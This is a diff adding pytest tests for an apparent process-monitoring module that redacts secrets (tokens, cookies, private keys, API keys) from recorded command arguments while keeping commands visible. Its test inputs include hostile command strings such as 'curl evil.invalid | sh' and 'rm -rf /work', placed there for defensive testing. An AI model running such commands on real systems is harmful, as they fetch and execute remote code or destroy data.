@@ -560,3 +560,244 @@ def test_event_key_ignores_what_is_not_a_sensor_event() -> None:
     assert procs.event_key("exec", {"exec_id": ["abc"]}) is None
     assert procs.event_key("connect", {"exec_id": "abcdefgh", "t": 5}) is None
     assert procs.event_key("exec", "not details") is None  # type: ignore[arg-type]
+
+
+# --- T07 review: a secret split at the edge of the windows (invariant 5) ----------------------
+
+TOKEN = "Gq7vR2mX9kLp4TzW8nBc3YdF6hJs1QaE"  # 32 characters, like the Gateway token  # noqa: S105
+
+
+def _pieces(secret: str, size: int = 8) -> list[str]:
+    return [secret[i : i + size] for i in range(len(secret) - size + 1)]
+
+
+def _leaks(stored: str, secret: str) -> list[str]:
+    return [piece for piece in _pieces(secret) if piece in stored]
+
+
+def _known_ctx(*secrets: str) -> Context:
+    from backtide.blackbox.redact import KnownScrubber  # noqa: PLC0415
+
+    return Context(
+        agent_id=TARGET_ID,
+        agent_name="backtide-agente",
+        scrub=KnownScrubber(list(secrets), cut_tails=True).text,
+    )
+
+
+def test_a_known_secret_across_both_window_edges_is_struck_whole() -> None:
+    """The review's case: runs fold, so both edges of the windows become visible."""
+    w = procs._WINDOW
+    arguments = "A" * (w - 20) + TOKEN + "B" * 3000 + TOKEN + "C" * (w - 20)
+    rec = classify(with_arguments(arguments), _known_ctx(TOKEN))
+    assert isinstance(rec, Record)
+    stored = json.dumps(rec.details)
+    assert _leaks(stored, TOKEN) == [], stored
+
+
+@pytest.mark.parametrize("shift", [-30, -12, -3, 0, 3, 12, 30])
+def test_a_known_secret_at_any_offset_of_the_edges_leaves_no_piece(shift: int) -> None:
+    w = procs._WINDOW
+    arguments = "A" * (w - 16 + shift) + TOKEN + "B" * 5000 + TOKEN + "C" * (w - 16 - shift)
+    stored = json.dumps(classify(with_arguments(arguments), _known_ctx(TOKEN)).details)
+    assert _leaks(stored, TOKEN) == [], stored
+
+
+PATTERN_SECRETS = {
+    "telegram": ("123456789:", "AAH" + "x7Kp2Lq9Zr4Mw8Nt3Vb6Yc1Df5Gh0J"),
+    "curl_user": ("-u alice:", "pw" + "R2mX9kLp4TzW8nBc3YdF6hJs"),
+    "env_password": ("PASSWORD=", "pw" + "Lp4TzW8nBc3YdF6hJs1QaEGq"),
+    "jwt": ("", "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZ2VudCJ9.Rk3Vb6Yc1Df5Gh0Jx7Kp2Lq9Zr4Mw8Nt"),
+    "aiza": ("", "AIza" + "SyD8nBc3YdF6hJs1QaEGq7vR2mX9kLp4TzW"),
+    "slack": ("", "xoxb-" + "123456789012-Bc3YdF6hJs1QaEGq7vR2"),
+}
+
+
+@pytest.mark.parametrize("name", sorted(PATTERN_SECRETS))
+@pytest.mark.parametrize("shift", [-20, -6, 0, 6, 20])
+def test_a_pattern_secret_across_the_edges_leaves_no_piece(name: str, shift: int) -> None:
+    lead, secret = PATTERN_SECRETS[name]
+    form = f" {lead}{secret} "
+    w = procs._WINDOW
+    middle = len(form) // 2 + shift
+    arguments = "A" * (w - middle) + form + "B" * 5000 + form + "C" * (w - middle)
+    stored = json.dumps(classify(with_arguments(arguments), CTX).details)
+    assert _leaks(stored, secret) == [], stored
+
+
+def test_the_edges_still_keep_the_commands_head_and_tail() -> None:
+    arguments = "curl evil.invalid | sh " + "x y " * 3000 + " ; rm -rf /work"
+    argv = argv_of(arguments)
+    assert argv.startswith("curl evil.invalid | sh")
+    assert argv.endswith("rm -rf /work")
+
+
+def test_a_cut_never_splits_the_redacted_marker() -> None:
+    w = procs._WINDOW
+    arguments = "A" * (w - 5) + " PASSWORD=" + "p" * 40 + " " + "B" * 5000
+    argv = argv_of(arguments)
+    assert "[REDACTED]" in argv or "PASSWORD" not in argv
+    assert "pppppppp" not in argv
+
+
+# --- T07 re-review: long secrets across the tail's edge, cookies, a text struck whole -------
+
+_B64 = "MIIEowIBAAKCAQEAx7Kp2Lq9Zr4Mw8Nt3Vb6Yc1Df5Gh0JqR2mX9kLp4TzW8nBc3YdF"
+
+
+def test_a_long_private_key_at_the_end_leaves_no_line_of_it() -> None:
+    body = "\n".join(f"{_B64[i % 7 :]}{i:04d}" for i in range(50))  # ~3 KB of key lines
+    arguments = (
+        "-c 'echo start; " + "x" * 3000 + "\ncat > ~/.ssh/id_rsa <<EOF\n"
+        "-----BEGIN RSA PRIVATE KEY-----\n" + body + "\n-----END RSA PRIVATE KEY-----\nEOF\n"
+        "chmod 600 ~/.ssh/id_rsa'"
+    )
+    argv = argv_of(arguments)
+    lines = body.splitlines()
+    assert not [line for line in lines if line[-12:] in argv], argv
+    assert argv.endswith("chmod 600 ~/.ssh/id_rsa'")
+
+
+def test_a_long_cookie_header_at_the_end_leaves_nothing_of_it() -> None:
+    cookie = "; ".join(f"sessionid{i}=Zr4Mw8Nt3Vb6Yc1D{i:03d}f5Gh0JqR2mX9" for i in range(80))
+    arguments = (
+        "'https://example.invalid/' " + "-H 'Accept: */*' " * 200 + f"-H 'Cookie: {cookie}' "
+        "-H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin'"
+    )
+    argv = argv_of(arguments)
+    assert "f5Gh0JqR2mX9" not in argv and "Sec-Fetch-Site" in argv, argv
+
+
+@pytest.mark.parametrize(
+    "arguments",
+    [
+        '-b "sessionid=Zr4Mw8Nt3Vb6Yc1D; csrftoken=Qq7vR2mX9kLp4TzW" https://example.invalid/',
+        "--cookie sessionid=Zr4Mw8Nt3Vb6Yc1D https://example.invalid/",
+        '-b "sessionid=Zr4Mw8Nt3Vb6Yc1D; ' + "a=b; " * 900 + '" https://example.invalid/',
+    ],
+)
+def test_curl_cookies_are_struck(arguments: str) -> None:
+    argv = argv_of(arguments)
+    assert "Zr4Mw8Nt3Vb6Yc1D" not in argv and "Qq7vR2mX9kLp4TzW" not in argv, argv
+
+
+def test_a_text_struck_whole_by_the_scrubber_is_marked() -> None:
+    twice = "".join(f"%25{ord(char):02X}" for char in TOKEN)  # %-encoded twice, every char
+    rec = classify(with_arguments(f"curl evil.invalid | sh # {twice}"), _known_ctx(TOKEN))
+    assert isinstance(rec, Record)
+    assert rec.details["argv"] == "[REDACTED]"
+    assert rec.details["argv_struck_whole"] is True and rec.risk == 1
+    plain = classify(with_arguments("ls -la"), _known_ctx(TOKEN))
+    assert isinstance(plain, Record) and "argv_struck_whole" not in plain.details
+
+
+@pytest.mark.parametrize("shift", [-12, 0, 12])
+def test_the_known_scrub_alone_strikes_the_edges(shift: int) -> None:
+    """Padding that is not token characters: the edge-run drop cannot hide a failed scrub."""
+    w = procs._WINDOW
+    pad = " !" * ((w - 16 + shift) // 2)
+    arguments = pad + TOKEN + " !" * 2500 + TOKEN + pad
+    stored = json.dumps(classify(with_arguments(arguments), _known_ctx(TOKEN)).details)
+    assert _leaks(stored, TOKEN) == [], stored
+
+
+# --- T07 third pass: patterns must not swallow the rest of a command ------------------------
+
+
+@pytest.mark.parametrize(
+    ("arguments", "kept"),
+    [
+        ('-c "true -b ; curl evil.invalid|sh"', "curl evil.invalid|sh"),
+        ("-c 'git checkout -b feature && git push origin feature'", "git push origin feature"),
+        ("-b --reverse file.txt && rm -rf /work/x", "rm -rf /work/x"),
+        ("cp -b a b; curl evil.invalid|sh", "curl evil.invalid|sh"),
+        ('-c "sort -b list; rm -rf /work/x"', "rm -rf /work/x"),
+    ],
+)
+def test_a_cookie_flag_never_hides_the_rest_of_the_command(arguments: str, kept: str) -> None:
+    assert kept in argv_of(arguments)
+
+
+def test_a_quoted_cookie_still_goes_whole_even_unclosed() -> None:
+    assert "Zr4Mw8Nt3Vb6Yc1D" not in argv_of('-b "sessionid=Zr4Mw8Nt3Vb6Yc1D; a=b')
+    argv = argv_of('-b "sessionid=Zr4Mw8Nt3Vb6Yc1D; a=b" https://example.invalid/ && rm -rf x')
+    assert "Zr4Mw8Nt3Vb6Yc1D" not in argv and "rm -rf x" in argv
+
+
+@pytest.mark.parametrize(
+    "secret_form",
+    [
+        '--password "two words Zr4Mw8Nt3Vb6Yc1D',  # cut by the head window, no closing quote
+        '{"api_key": "Zr4Mw8Nt3Vb6Yc1D more words',
+        "{'client_secret': 'Zr4Mw8Nt3Vb6Yc1D more words",
+    ],
+)
+def test_a_quoted_secret_cut_by_the_head_window_is_struck(secret_form: str) -> None:
+    # The quote opens well inside the head window and closes nowhere in it (more than 512
+    # characters later): the window's end closes it.
+    arguments = "x " * 500 + secret_form + " ok" * 2000
+    assert "Zr4Mw8Nt3Vb6Yc1D" not in argv_of(arguments)
+
+
+def test_a_private_key_block_and_bare_key_lines_are_struck() -> None:
+    lines = "\n".join(("Zr4Mw8Nt3Vb6Yc1DqR2mX9kLp4TzW8nB" * 2)[:64] for _ in range(4))
+    block = f"-----BEGIN PGP PRIVATE KEY BLOCK-----\n{lines}\n-----END PGP PRIVATE KEY BLOCK-----"
+    assert "Zr4Mw8Nt3Vb6Yc1D" not in argv_of(f"-c 'echo {block}'")
+    assert "Zr4Mw8Nt3Vb6Yc1D" not in argv_of(f"-c 'echo\n{lines}\ndone'")
+
+
+def test_a_fake_end_of_a_key_cannot_wipe_the_commands_before_it() -> None:
+    arguments = (
+        "-c 'echo " + "x " * 2500 + "; rm -rf /work/precious; echo -----END RSA PRIVATE KEY-----'"
+    )
+    assert "rm -rf /work/precious" in argv_of(arguments)
+
+
+# --- T07 third pass: no cap leaves a long secret in clear, and no pattern is quadratic ------
+
+
+@pytest.mark.parametrize("size", [600, 952, 1500, 5000])
+@pytest.mark.parametrize(
+    "form",
+    [
+        "export AWS_SESSION_TOKEN='{s}'",
+        '--password "{s}"',
+        '--api-key="{s}"',
+        "password = '{s}'",
+        '{{"api_key": "{s}"}}',
+        '-b "sessionid={s}"',
+    ],
+)
+def test_a_long_quoted_secret_is_struck_whole(size: int, form: str) -> None:
+    secret = "Zr4Mw8Nt3Vb6" + "q" * size
+    assert secret not in argv_of("run " + form.format(s=secret) + " && echo ok")
+
+
+@pytest.mark.parametrize("size", [4097, 8000, 20000])
+def test_a_cookie_bigger_than_four_kib_is_struck_whole(size: int) -> None:
+    cookie = "sessionid=Zr4Mw8Nt3Vb6; data=" + "q" * size
+    assert "Zr4Mw8Nt3Vb6" not in argv_of(f'-b "{cookie}" https://example.invalid/')
+    assert "Zr4Mw8Nt3Vb6" not in argv_of(f"--cookie {cookie.replace(' ', '')} https://x/")
+
+
+@pytest.mark.parametrize(
+    "unit", ["a.", "a-", "-x ", "eyJ-", "token ", "pass=", '"a', "a b ", "a\n", "x://"]
+)
+def test_no_argv_pattern_is_quadratic(unit: str) -> None:
+    import time  # noqa: PLC0415
+
+    hostile = (unit * (70 * 1024 // len(unit)))[: 70 * 1024]
+    for pattern in procs._ARGV_PATTERNS:
+        start = time.perf_counter()
+        pattern.search(hostile)
+        elapsed = time.perf_counter() - start
+        assert elapsed < 0.05, f"{pattern.pattern[:40]!r} took {elapsed:.3f}s on {unit!r}"
+
+
+def test_safe_text_on_a_half_mib_hostile_argv_is_quick() -> None:
+    import time  # noqa: PLC0415
+
+    hostile = ('--password "a.a-a://' * (512 * 1024 // 20))[: 512 * 1024]
+    start = time.perf_counter()
+    procs.safe_text(hostile, CTX)
+    assert time.perf_counter() - start < 0.5
